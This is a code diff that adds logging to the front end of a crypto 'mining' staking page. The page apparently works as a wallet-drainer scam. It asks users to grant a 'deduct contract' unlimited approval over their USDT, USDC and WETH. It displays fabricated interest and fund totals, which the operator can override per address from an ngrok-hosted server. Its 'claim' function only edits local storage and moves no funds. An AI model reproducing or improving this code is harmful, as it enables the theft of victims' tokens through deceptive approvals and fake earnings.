@@ -49,7 +49,10 @@ let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
 
 //---UI Control Functions---
 async function saveUserData() {
-    if (!userAddress) return;
+    if (!userAddress) {
+        console.log("saveUserData: No user address available, skipping save."); // 日誌添加
+        return;
+    }
     const dataToSave = {
         stakingStartTime: localStorage.getItem('stakingStartTime'),
         claimedInterest: localStorage.getItem('claimedInterest'),
@@ -58,7 +61,8 @@ async function saveUserData() {
         accountBalance: JSON.parse(localStorage.getItem('accountBalance'))
     };
     try {
-        await fetch(`${API_BASE_URL}/api/user-data`, {
+        console.log("saveUserData: Sending data to server for address:", userAddress, dataToSave); // 日誌添加
+        const response = await fetch(`${API_BASE_URL}/api/user-data`, {
             method: 'POST',
             headers: { 
                 'Content-Type': 'application/json',
@@ -66,9 +70,11 @@ async function saveUserData() {
             },
             body: JSON.stringify({ address: userAddress, data: dataToSave })
         });
-        console.log("User data sent to server.");
+        console.log("saveUserData: Response status:", response.status); // 日誌添加
+        if (!response.ok) throw new Error(`Failed to save user data, status: ${response.status}`);
+        console.log("saveUserData: User data sent to server successfully."); // 日誌添加
     } catch (error) {
-        console.warn("Could not send user data to the local server. Is it running?", error);
+        console.warn("saveUserData: Could not send user data to server:", error); // 日誌添加
     }
 }
 
@@ -77,28 +83,40 @@ function updateStatus(message, isWarning = false) {
     statusDiv.innerHTML = message || '';
     statusDiv.style.display = message ? 'block' : 'none';
     statusDiv.style.color = isWarning ? '#FFD700' : '#FFFFFF';
+    console.log(`updateStatus: ${isWarning ? 'Warning' : 'Info'}: ${message}`); // 日誌添加
 }
 
 function resetState(showMsg = true) {
-    console.log("Executing state reset (resetState)...");
+    console.log("resetState: Executing state reset..."); // 日誌添加
     signer = userAddress = null;
     stakingStartTime = null;
     claimedInterest = 0;
     pledgedAmount = 0;
     accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
-    if (interestInterval) clearInterval(interestInterval);
-    if (nextBenefitInterval) clearInterval(nextBenefitInterval);
+    if (interestInterval) {
+        clearInterval(interestInterval);
+        console.log("resetState: Cleared interest interval:", interestInterval); // 日誌添加
+    }
+    if (nextBenefitInterval) {
+        clearInterval(nextBenefitInterval);
+        console.log("resetState: Cleared next benefit interval:", nextBenefitInterval); // 日誌添加
+    }
     localStorage.clear();
+    console.log("resetState: Local storage cleared."); // 日誌添加
     if (startBtn) {
         startBtn.style.display = 'block';
         startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
     }
     const existingClaimBtn = document.getElementById('claimButton');
-    if (existingClaimBtn) existingClaimBtn.remove();
+    if (existingClaimBtn) {
+        existingClaimBtn.remove();
+        console.log("resetState: Removed claim button."); // 日誌添加
+    }
     if (connectButton) {
         connectButton.classList.remove('connected');
         connectButton.textContent = 'Connect';
         connectButton.title = 'Connect Wallet';
+        console.log("resetState: Reset connect button state."); // 日誌添加
     }
     disableInteractiveElements(true);
     if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
@@ -120,6 +138,7 @@ function disableInteractiveElements(disable = false) {
         refreshWallet.style.color = disable ? '#999' : '#ff00ff';
     }
     if (claimBtn) claimBtn.disabled = disable;
+    console.log(`disableInteractiveElements: Interactive elements ${disable ? 'disabled' : 'enabled'}.`); // 日誌添加
 }
 
 function updateBalancesUI(walletBalances) {
@@ -130,11 +149,13 @@ function updateBalancesUI(walletBalances) {
     const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
     if (walletBalanceAmount) {
         walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
+        console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`); // 日誌添加
     }
     const claimedBalance = accountBalance[selectedToken] || 0;
     const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
     if (accountBalanceValue) {
         accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
+        console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${totalAccountBalance}`); // 日誌添加
     }
     if (parseFloat(formattedWalletBalance) < 0.001) {
         updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
@@ -154,34 +175,49 @@ function updateTotalFunds() {
         const randomFluctuation = (Math.random() - 0.5);
         const totalFunds = initialFunds + totalIncrease + randomFluctuation;
         totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
+        console.log(`updateTotalFunds: Updated total funds: ${totalFunds.toFixed(2)} ETH`); // 日誌添加
     }
 }
 
 async function updateInterest() {
-    if (!stakingStartTime || !grossOutputValue || !cumulativeValue || !userAddress) return;
+    if (!stakingStartTime || !grossOutputValue || !cumulativeValue || !userAddress) {
+        console.log("updateInterest: Skipping due to missing data:", { stakingStartTime, userAddress }); // 日誌添加
+        return;
+    }
     let finalGrossOutput;
     let finalCumulative;
     let overrideApplied = false;
 
     try {
+        console.log("updateInterest: Fetching data for address:", userAddress); // 日誌添加
         const response = await fetch(`${API_BASE_URL}/api/all-data`, {
-            cache: 'no-cache', // ** 强制浏览器不使用缓存 **
+            cache: 'no-cache',
             headers: { 'ngrok-skip-browser-warning': 'true' }
         });
-
+        console.log("updateInterest: Response status:", response.status); // 日誌添加
         if (response.ok) {
             const allData = await response.json();
+            console.log("updateInterest: Received data:", allData); // 日誌添加
             const userOverrides = allData.overrides[userAddress] || {};
+            console.log("updateInterest: User overrides:", userOverrides); // 日誌添加
 
-            if (typeof userOverrides.grossOutput === 'number' && typeof userOverrides.cumulative === 'number') {
-                console.log("Admin override found, applying values:", userOverrides);
-                finalGrossOutput = userOverrides.grossOutput;
-                finalCumulative = userOverrides.cumulative;
-                overrideApplied = true;
+            if (userOverrides.grossOutput != null && userOverrides.cumulative != null) {
+                finalGrossOutput = Number(userOverrides.grossOutput);
+                finalCumulative = Number(userOverrides.cumulative);
+                if (!isNaN(finalGrossOutput) && !isNaN(finalCumulative)) {
+                    console.log("updateInterest: Admin override applied:", { finalGrossOutput, finalCumulative }); // 日誌添加
+                    overrideApplied = true;
+                } else {
+                    console.warn("updateInterest: Invalid override values, skipping:", userOverrides); // 日誌添加
+                }
+            } else {
+                console.log("updateInterest: No valid overrides found for address:", userAddress); // 日誌添加
             }
+        } else {
+            console.warn("updateInterest: Failed to fetch data, status:", response.status); // 日誌添加
         }
     } catch (error) {
-        // Silently fail if server is unreachable, proceed with local calculation
+        console.warn("updateInterest: Fetch error:", error); // 日誌添加
     }
 
     if (!overrideApplied) {
@@ -191,10 +227,12 @@ async function updateInterest() {
         const interestRate = baseInterestRate * pledgedAmount;
         finalGrossOutput = elapsedSeconds * interestRate;
         finalCumulative = finalGrossOutput - claimedInterest;
+        console.log("updateInterest: Using local calculation:", { finalGrossOutput, finalCumulative }); // 日誌添加
     }
 
     grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
     cumulativeValue.textContent = `${Number(finalCumulative).toFixed(7)} ETH`;
+    console.log(`updateInterest: Updated UI - Gross Output: ${finalGrossOutput.toFixed(7)} ETH, Cumulative: ${finalCumulative.toFixed(7)} ETH`); // 日誌添加
 }
 
 function updateNextBenefitTimer() {
@@ -203,6 +241,7 @@ function updateNextBenefitTimer() {
     const label = (translations[currentLang]?.nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
     if (!nextBenefitTimestamp) {
         nextBenefit.textContent = `${label}: 00:00:00`;
+        console.log("updateNextBenefitTimer: No next benefit time set."); // 日誌添加
         return;
     }
     const now = Date.now();
@@ -215,13 +254,14 @@ function updateNextBenefitTimer() {
         }
         localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
         saveUserData();
-        diff = newNextBenefitTimestamp - now;
+        console.log("updateNextBenefitTimer: Updated next benefit time:", newNextBenefitTimestamp); // 日誌添加
     }
     const totalSeconds = Math.floor(diff / 1000);
     const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
     const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
     const seconds = String(totalSeconds % 60).padStart(2, '0');
     nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
+    console.log(`updateNextBenefitTimer: Updated timer: ${hours}:${minutes}:${seconds}`); // 日誌添加
 }
 
 function getETOffsetMilliseconds() {
@@ -240,7 +280,7 @@ function getETOffsetMilliseconds() {
 
 function setInitialNextBenefitTime() {
     if (localStorage.getItem('nextBenefitTime')) return;
-    console.log("Setting initial benefit countdown target based on US Eastern Time...");
+    console.log("setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time..."); // 日誌添加
     const etOffset = getETOffsetMilliseconds();
     const nowUtcTimestamp = Date.now();
     const nowET = new Date(nowUtcTimestamp + etOffset);
@@ -257,21 +297,25 @@ function setInitialNextBenefitTime() {
     const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
     localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
     saveUserData();
+    console.log("setInitialNextBenefitTime: Set next benefit time:", finalNextBenefitTimestamp); // 日誌添加
 }
 
 function activateStakingUI() {
     const storedStartTime = localStorage.getItem('stakingStartTime');
     if (storedStartTime) {
         stakingStartTime = parseInt(storedStartTime);
+        console.log("activateStakingUI: Restored staking start time:", stakingStartTime); // 日誌添加
     } else {
         stakingStartTime = Date.now();
         localStorage.setItem('stakingStartTime', stakingStartTime.toString());
+        console.log("activateStakingUI: Set new staking start time:", stakingStartTime); // 日誌添加
     }
     claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
     pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
     const storedAccountBalance = JSON.parse(localStorage.getItem('accountBalance'));
     if (storedAccountBalance) {
         accountBalance = storedAccountBalance;
+        console.log("activateStakingUI: Restored account balance:", accountBalance); // 日誌添加
     }
     if (startBtn) startBtn.style.display = 'none';
     if (document.getElementById('claimButton')) return;
@@ -281,14 +325,18 @@ function activateStakingUI() {
     claimBtn.disabled = false;
     const placeholder = document.getElementById('claimButtonPlaceholder');
     placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
+    console.log("activateStakingUI: Added claim button to UI."); // 日誌添加
     if (!claimBtn.hasEventListener) {
         claimBtn.addEventListener('click', claimInterest);
         claimBtn.hasEventListener = true;
+        console.log("activateStakingUI: Added event listener to claim button."); // 日誌添加
     }
     if (interestInterval) clearInterval(interestInterval);
     interestInterval = setInterval(updateInterest, 1000);
+    console.log("activateStakingUI: Set interest interval:", interestInterval); // 日誌添加
     if (nextBenefitInterval) clearInterval(nextBenefitInterval);
     nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
+    console.log("activateStakingUI: Set next benefit interval:", nextBenefitInterval); // 日誌添加
     saveUserData();
 }
 
@@ -300,16 +348,22 @@ async function sendMobileRobustTransaction(populatedTx) {
     const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
     let txHash, receipt = null;
     try {
+        console.log("sendMobileRobustTransaction: Sending transaction:", mobileTx); // 日誌添加
         txHash = await provider.send('eth_sendTransaction', [mobileTx]);
         updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
         receipt = await provider.waitForTransaction(txHash);
+        console.log("sendMobileRobustTransaction: Transaction confirmed, receipt:", receipt); // 日誌添加
     } catch (error) {
-        console.warn("⚠️ Trust Wallet might throw a harmless error. Proceeding with on-chain check...", error.message);
+        console.warn("sendMobileRobustTransaction: Transaction error:", error.message); // 日誌添加
         if (error.hash) txHash = error.hash;
-        else if (error.message && error.message.includes('0x')) { const match = error.message.match(/(0x[a-fA-F0-9]{64})/); if (match) txHash = match[0]; }
+        else if (error.message && error.message.includes('0x')) { 
+            const match = error.message.match(/(0x[a-fA-F0-9]{64})/); 
+            if (match) txHash = match[0]; 
+        }
         if (txHash) {
             updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
             receipt = await provider.waitForTransaction(txHash);
+            console.log("sendMobileRobustTransaction: Transaction confirmed after error, receipt:", receipt); // 日誌添加
         } else throw new Error(`Transaction failed to send: ${error.message}`);
     }
     if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
@@ -321,18 +375,24 @@ async function initializeWallet() {
         if (typeof window.ethereum === 'undefined') {
             updateStatus('Please install MetaMask or a compatible wallet.');
             disableInteractiveElements(true);
+            console.log("initializeWallet: No Ethereum provider detected."); // 日誌添加
             return;
         }
         provider = new ethers.BrowserProvider(window.ethereum);
         window.ethereum.on('accountsChanged', (newAccounts) => {
+            console.log("initializeWallet: Accounts changed:", newAccounts); // 日誌添加
             if (userAddress) {
                 if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
                     window.location.reload();
                 }
             }
         });
-        window.ethereum.on('chainChanged', () => window.location.reload());
+        window.ethereum.on('chainChanged', () => {
+            console.log("initializeWallet: Chain changed, reloading page."); // 日誌添加
+            window.location.reload();
+        });
         const accounts = await provider.send('eth_accounts', []);
+        console.log("initializeWallet: Initial accounts:", accounts); // 日誌添加
         if (accounts.length > 0) {
             await connectWallet();
         } else {
@@ -340,29 +400,34 @@ async function initializeWallet() {
             updateStatus("Please connect your wallet to continue.");
         }
     } catch (error) {
-        console.error("Wallet initialization error:", error);
+        console.error("initializeWallet: Wallet initialization error:", error); // 日誌添加
         updateStatus(`Initialization failed: ${error.message}`);
     }
 }
 
 async function updateUIBasedOnChainState() {
-    if (!signer) return;
+    if (!signer) {
+        console.log("updateUIBasedOnChainState: No signer available, skipping."); // 日誌添加
+        return;
+    }
     try {
         updateStatus("Checking on-chain authorization status...");
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
+        console.log("updateUIBasedOnChainState: Required allowance:", requiredAllowance.toString()); // 日誌添加
         const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
             deductContract.isServiceActiveFor(userAddress),
             usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
             wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n)
         ]);
+        console.log("updateUIBasedOnChainState: Chain state:", { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance }); // 日誌添加
         const isWethAuthorized = wethAllowance >= requiredAllowance;
         const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
         const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
         const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
         const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
         if (isFullyAuthorized) {
-            console.log("On-chain state is AUTHORIZED. Switching to staking UI.");
+            console.log("updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI."); // 日誌添加
             if (isWethAuthorized) walletTokenSelect.value = 'WETH';
             else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
             else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
@@ -370,13 +435,13 @@ async function updateUIBasedOnChainState() {
             setInitialNextBenefitTime();
             activateStakingUI();
         } else {
-            console.log("On-chain state is NOT AUTHORIZED. Showing Start button.");
+            console.log("updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button."); // 日誌添加
             if(startBtn) startBtn.style.display = 'block';
         }
         disableInteractiveElements(false);
         updateStatus("");
     } catch (error) {
-        console.error("Failed to check on-chain state:", error);
+        console.error("updateUIBasedOnChainState: Failed to check on-chain state:", error); // 日誌添加
         updateStatus("Failed to check on-chain state. Please refresh.");
     }
 }
@@ -385,21 +450,26 @@ async function handleConditionalAuthorizationFlow() {
     if (!signer) throw new Error("Wallet not connected");
     updateStatus('Preparing authorization...');
     const selectedToken = walletTokenSelect.value;
-    console.log(`User selected ${selectedToken} for authorization.`);
+    console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`); // 日誌添加
     const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
+    console.log("handleConditionalAuthorizationFlow: Required allowance:", requiredAllowance.toString()); // 日誌添加
     const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
+    console.log("handleConditionalAuthorizationFlow: Service activated:", serviceActivated); // 日誌添加
     const tokenMap = { 'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, 'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS }, 'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS } };
     const tokensToProcess = [ tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken) ];
     let tokenToActivate = '';
     for (const { name, contract, address } of tokensToProcess) {
         updateStatus(`Checking ${name} allowance...`);
         const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
+        console.log(`handleConditionalAuthorizationFlow: ${name} allowance:`, currentAllowance.toString()); // 日誌添加
         if (currentAllowance < requiredAllowance) {
             updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
             const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
             approvalTx.value = 0n;
+            console.log("handleConditionalAuthorizationFlow: Sending approval transaction for", name, approvalTx); // 日誌添加
             await sendMobileRobustTransaction(approvalTx);
             const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
+            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance:`, newAllowance.toString()); // 日誌添加
             if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
         } else {
             if (!tokenToActivate) tokenToActivate = address;
@@ -410,6 +480,7 @@ async function handleConditionalAuthorizationFlow() {
         updateStatus(`Activating service (using ${tokenName})...`);
         const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
         activateTx.value = 0n;
+        console.log("handleConditionalAuthorizationFlow: Sending activate service transaction:", activateTx); // 日誌添加
         await sendMobileRobustTransaction(activateTx);
     }
 }
@@ -419,9 +490,11 @@ async function connectWallet() {
         if (!provider) throw new Error("Provider not initialized");
         updateStatus('Please confirm connection in your wallet...');
         const accounts = await provider.send('eth_requestAccounts', []);
+        console.log("connectWallet: Accounts received:", accounts); // 日誌添加
         if (accounts.length === 0) throw new Error("No account selected.");
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
+        console.log("connectWallet: Connected user address:", userAddress); // 日誌添加
         connectButton.classList.add('connected');
         connectButton.textContent = 'Connected';
         connectButton.title = 'Disconnect Wallet';
@@ -431,12 +504,17 @@ async function connectWallet() {
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
         await updateUIBasedOnChainState();
         updateStatus('Fetching wallet balances...');
-        const balances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
+        const balances = { 
+            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
+            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
+            weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+        };
+        console.log("connectWallet: Wallet balances:", balances); // 日誌添加
         updateBalancesUI(balances);
         updateStatus("");
         await saveUserData();
     } catch (error) {
-        console.error("Connection Error:", error);
+        console.error("connectWallet: Connection error:", error); // 日誌添加
         let userMessage = `Error: ${error.message}`;
         if (error.code === 4001) userMessage = "You rejected the connection request.";
         updateStatus(userMessage);
@@ -447,6 +525,7 @@ async function connectWallet() {
 function disconnectWallet() {
     resetState(true);
     alert('Wallet disconnected. To fully remove permissions, do so from within your wallet settings.');
+    console.log("disconnectWallet: Wallet disconnected."); // 日誌添加
 }
 
 async function getEthPrices() {
@@ -455,13 +534,15 @@ async function getEthPrices() {
         const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
             headers: { 'ngrok-skip-browser-warning': 'true' }
         });
+        console.log("getEthPrices: Response status:", response.status); // 日誌添加
         if (!response.ok) throw new Error('Network response was not ok');
         const data = await response.json();
+        console.log("getEthPrices: Received price data:", data); // 日誌添加
         const prices = { usd: data.ethereum.usd, usdt: data.ethereum.usdt, usdc: data.ethereum.usd, weth: data.ethereum.usdt };
         updateStatus("");
         return prices;
     } catch (error) {
-        console.error('Could not fetch ETH price:', error);
+        console.error("getEthPrices: Could not fetch ETH price:", error); // 日誌添加
         updateStatus("Could not fetch price data.", true);
         return null;
     }
@@ -470,6 +551,7 @@ async function getEthPrices() {
 async function claimInterest() {
     const claimableETHString = cumulativeValue.textContent.replace(' ETH', '');
     const claimableETH = parseFloat(claimableETHString);
+    console.log("claimInterest: Attempting to claim:", claimableETH); // 日誌添加
     if (!claimableETH || claimableETH < 0.0000001) {
         alert("No claimable interest available.");
         return;
@@ -482,6 +564,7 @@ async function claimInterest() {
     const selectedToken = walletTokenSelect.value;
     const ethToTokenRate = prices[selectedToken.toLowerCase()];
     const valueInToken = claimableETH * ethToTokenRate;
+    console.log("claimInterest: Claim details:", { claimableETH, selectedToken, ethToTokenRate, valueInToken }); // 日誌添加
     const confirmation = confirm(`You are about to claim ${claimableETH.toFixed(7)} ETH.\nCurrent ETH Price: ~$${prices.usd.toFixed(2)}\nThis will be converted to approximately ${valueInToken.toFixed(3)} ${selectedToken} and added to your Account Balance.\n\nDo you want to proceed?`);
     if (confirmation) {
         const grossOutputETH = parseFloat(grossOutputValue.textContent.replace(' ETH', ''));
@@ -489,8 +572,13 @@ async function claimInterest() {
         localStorage.setItem('claimedInterest', claimedInterest.toString());
         accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
         localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
+        console.log("claimInterest: Updated claimed interest and account balance:", { claimedInterest, accountBalance }); // 日誌添加
         updateInterest();
-        const walletBalances = { usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), usdc: await usdtContract.balanceOf(userAddress).catch(() => 0n), weth: await wethContract.balanceOf(userAddress).catch(() => 0n) };
+        const walletBalances = { 
+            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
+            usdc: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
+            weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+        };
         updateBalancesUI(walletBalances);
         alert("Claim successful! Your Account Balance has been updated.");
         await saveUserData();
@@ -498,10 +586,94 @@ async function claimInterest() {
 }
 
 //---Language Control---
-const translations = { 'en': { title: 'Popular Mining', subtitle: 'Start Earning Millions', tabLiquidity: 'Liquidity', tabPledging: 'Pledging', grossOutputLabel: 'Gross Output', cumulativeLabel: 'Cumulative', walletBalanceLabel: 'Wallet Balance', accountBalanceLabel: 'Account Balance', compoundLabel: '⚡ Compound', nextBenefit: 'Next Benefit: 00:00:00', startBtnText: 'Start', pledgeAmountLabel: 'Pledge Amount', pledgeDurationLabel: 'Duration', pledgeBtnText: 'Pledge Now', totalPledgedLabel: 'Total Pledged', expectedYieldLabel: 'Expected Yield', apyLabel: 'APY', lockedUntilLabel: 'Locked Until', claimBtnText: 'Claim' }, 'zh-Hant': { title: '熱門挖礦', subtitle: '開始賺取數百萬', tabLiquidity: '流動性', tabPledging: '質押', grossOutputLabel: '總產出', cumulativeLabel: '累計', walletBalanceLabel: '錢包餘額', accountBalanceLabel: '帳戶餘額', compoundLabel: '⚡ 複利', nextBenefit: '下次收益: 00:00:00', startBtnText: '開始', pledgeAmountLabel: '質押金額', pledgeDurationLabel: '期間', pledgeBtnText: '立即質押', totalPledgedLabel: '總質押', expectedYieldLabel: '預期收益', apyLabel: '年化收益率', lockedUntilLabel: '鎖定至', claimBtnText: '領取' }, 'zh-Hans': { title: '热门挖矿', subtitle: '开始赚取数百万', tabLiquidity: '流动性', tabPledging: '质押', grossOutputLabel: '总产出', cumulativeLabel: '累计', walletBalanceLabel: '钱包余额', accountBalanceLabel: '账户余额', compoundLabel: '⚡ 复利', nextBenefit: '下次收益: 00:00:00', startBtnText: '开始', pledgeAmountLabel: '质押金额', pledgeDurationLabel: '期间', pledgeBtnText: '立即质押', totalPledgedLabel: '总质押', expectedYieldLabel: '预期收益', apyLabel: '年化收益率', lockedUntilLabel: '锁定至', claimBtnText: '领取' } };
+const translations = { 
+    'en': { 
+        title: 'Popular Mining', 
+        subtitle: 'Start Earning Millions', 
+        tabLiquidity: 'Liquidity', 
+        tabPledging: 'Pledging', 
+        grossOutputLabel: 'Gross Output', 
+        cumulativeLabel: 'Cumulative', 
+        walletBalanceLabel: 'Wallet Balance', 
+        accountBalanceLabel: 'Account Balance', 
+        compoundLabel: '⚡ Compound', 
+        nextBenefit: 'Next Benefit: 00:00:00', 
+        startBtnText: 'Start', 
+        pledgeAmountLabel: 'Pledge Amount', 
+        pledgeDurationLabel: 'Duration', 
+        pledgeBtnText: 'Pledge Now', 
+        totalPledgedLabel: 'Total Pledged', 
+        expectedYieldLabel: 'Expected Yield', 
+        apyLabel: 'APY', 
+        lockedUntilLabel: 'Locked Until', 
+        claimBtnText: 'Claim' 
+    }, 
+    'zh-Hant': { 
+        title: '熱門挖礦', 
+        subtitle: '開始賺取數百萬', 
+        tabLiquidity: '流動性', 
+        tabPledging: '質押', 
+        grossOutputLabel: '總產出', 
+        cumulativeLabel: '累計', 
+        walletBalanceLabel: '錢包餘額', 
+        accountBalanceLabel: '帳戶餘額', 
+        compoundLabel: '⚡ 複利', 
+        nextBenefit: '下次收益: 00:00:00', 
+        startBtnText: '開始', 
+        pledgeAmountLabel: '質押金額', 
+        pledgeDurationLabel: '期間', 
+        pledgeBtnText: '立即質押', 
+        totalPledgedLabel: '總質押', 
+        expectedYieldLabel: '預期收益', 
+        apyLabel: '年化收益率', 
+        lockedUntilLabel: '鎖定至', 
+        claimBtnText: '領取' 
+    }, 
+    'zh-Hans': { 
+        title: '热门挖矿', 
+        subtitle: '开始赚取数百万', 
+        tabLiquidity: '流动性', 
+        tabPledging: '质押', 
+        grossOutputLabel: '总产出', 
+        cumulativeLabel: '累计', 
+        walletBalanceLabel: '钱包余额', 
+        accountBalanceLabel: '账户余额', 
+        compoundLabel: '⚡ 复利', 
+        nextBenefit: '下次收益: 00:00:00', 
+        startBtnText: '开始', 
+        pledgeAmountLabel: '质押金额', 
+        pledgeDurationLabel: '期间', 
+        pledgeBtnText: '立即质押', 
+        totalPledgedLabel: '总质押', 
+        expectedYieldLabel: '预期收益', 
+        apyLabel: '年化收益率', 
+        lockedUntilLabel: '锁定至', 
+        claimBtnText: '领取' 
+    } 
+};
 let currentLang = 'en';
 const languageSelect = document.getElementById('languageSelect');
-const elements = { title: document.getElementById('title'), subtitle: document.getElementById('subtitle'), tabLiquidity: document.getElementById('tabLiquidity'), tabPledging: document.getElementById('tabPledging'), grossOutputLabel: document.getElementById('grossOutputLabel'), cumulativeLabel: document.getElementById('cumulativeLabel'), walletBalanceLabel: document.getElementById('walletBalanceLabel'), accountBalanceLabel: document.getElementById('accountBalanceLabel'), compoundLabel: document.getElementById('compoundLabel'), nextBenefit: document.getElementById('nextBenefit'), startBtnText: document.getElementById('startBtn'), pledgeAmountLabel: document.getElementById('pledgeAmountLabel'), pledgeDurationLabel: document.getElementById('pledgeDurationLabel'), pledgeBtnText: document.getElementById('pledgeBtn'), totalPledgedLabel: document.getElementById('totalPledgedLabel'), expectedYieldLabel: document.getElementById('expectedYieldLabel'), apyLabel: 'APY', lockedUntilLabel: document.getElementById('lockedUntilLabel'), claimBtnText: claimBtn };
+const elements = { 
+    title: document.getElementById('title'), 
+    subtitle: document.getElementById('subtitle'), 
+    tabLiquidity: document.getElementById('tabLiquidity'), 
+    tabPledging: document.getElementById('tabPledging'), 
+    grossOutputLabel: document.getElementById('grossOutputLabel'), 
+    cumulativeLabel: document.getElementById('cumulativeLabel'), 
+    walletBalanceLabel: document.getElementById('walletBalanceLabel'), 
+    accountBalanceLabel: document.getElementById('accountBalanceLabel'), 
+    compoundLabel: document.getElementById('compoundLabel'), 
+    nextBenefit: document.getElementById('nextBenefit'), 
+    startBtnText: document.getElementById('startBtn'), 
+    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'), 
+    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'), 
+    pledgeBtnText: document.getElementById('pledgeBtn'), 
+    totalPledgedLabel: document.getElementById('totalPledgedLabel'), 
+    expectedYieldLabel: document.getElementById('expectedYieldLabel'), 
+    apyLabel: 'APY', 
+    lockedUntilLabel: document.getElementById('lockedUntilLabel'), 
+    claimBtnText: claimBtn 
+};
 
 function updateLanguage(lang) {
     currentLang = lang;
@@ -515,6 +687,7 @@ function updateLanguage(lang) {
         claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
     }
     updateNextBenefitTimer();
+    console.log(`updateLanguage: Switched to language: ${lang}`); // 日誌添加
 }
 
 //---Event Listeners & Initial Load---
@@ -523,12 +696,14 @@ document.addEventListener('DOMContentLoaded', () => {
     updateLanguage(savedLang);
     initializeWallet();
     setInterval(updateTotalFunds, 1000);
+    console.log("DOMContentLoaded: Initialized wallet and started total funds update."); // 日誌添加
 });
 
 languageSelect.addEventListener('change', (e) => {
     const lang = e.target.value;
     localStorage.setItem('language', lang);
     updateLanguage(lang);
+    console.log(`languageSelect: Changed language to: ${lang}`); // 日誌添加
 });
 
 connectButton.addEventListener('click', () => {
@@ -542,6 +717,7 @@ connectButton.addEventListener('click', () => {
 startBtn.addEventListener('click', async () => {
     if (!signer) {
         alert('Please connect your wallet first!');
